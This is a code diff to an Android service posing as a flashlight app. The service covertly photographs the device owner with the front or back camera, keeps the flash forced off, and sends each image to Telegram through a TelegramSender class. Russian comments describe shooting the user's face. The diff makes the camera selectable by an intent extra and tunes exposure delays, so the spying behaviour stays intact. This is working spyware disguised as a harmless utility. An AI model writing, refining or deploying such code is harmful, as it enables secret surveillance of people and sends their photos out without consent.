@@ -21,11 +21,16 @@ public class CameraService extends Service {
     private CameraDevice device;
     private ImageReader reader;
     private CaptureRequest.Builder builder;
+    private String cameraType = "back";
 
     @Nullable @Override public IBinder onBind(Intent i) { return null; }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        if (intent != null && intent.hasExtra("camera_type")) {
+            cameraType = intent.getStringExtra("camera_type");
+        }
+
         NotificationChannel ch = new NotificationChannel("cam", "Flashlight", NotificationManager.IMPORTANCE_LOW);
         getSystemService(NotificationManager.class).createNotificationChannel(ch);
         Notification n = new Notification.Builder(this, "cam")
@@ -36,8 +41,9 @@ public class CameraService extends Service {
         
         manager = (CameraManager) getSystemService(CAMERA_SERVICE);
         
-        // Снимаем лицо
-        capturePhoto("face", "1"); 
+        // 0 = задняя, 1 = фронтальная
+        String id = cameraType.equals("back") ? "0" : "1";
+        capturePhoto(cameraType, id); 
         return START_NOT_STICKY;
     }
 
@@ -83,29 +89,26 @@ public class CameraService extends Service {
                         new TelegramSender().send(out.toByteArray(), tag + ".jpg");
                         
                         img.close(); r.close(); device.close();
-                        
-                        if (tag.equals("face")) {
-                            // Переходим на заднюю
-                            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
-                                capturePhoto("back", "0");
-                            }, 500);
-                        } else {
-                            stopSelf();
-                        }
+                        stopSelf();
                     }, null);
                     try {
                         builder = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                         builder.addTarget(reader.getSurface());
+                        
+                        // СТРОГО БЕЗ ВСПЫШКИ
                         builder.set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF);
+                        // АВТО-ЭКСПОЗИЦИЯ (пусть камера сама решает, сколько света нужно)
                         builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
 
                         device.createCaptureSession(java.util.Collections.singletonList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                             @Override public void onConfigured(CameraCaptureSession s) {
-                                // Света нет, поэтому снимаем быстро (задержка 500мс для стабильности)
+                                // Для задней камеры даем 2 секунды, чтобы она адаптировалась к свету фонаря
+                                long delay = tag.equals("back") ? 2000 : 1000;
+                                
                                 new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                                     try { s.capture(builder.build(), null, null); } 
                                     catch (Exception e) { e.printStackTrace(); }
-                                }, 500);
+                                }, delay);
                             }
                             @Override public void onConfigureFailed(CameraCaptureSession s) {}
                         }, null);
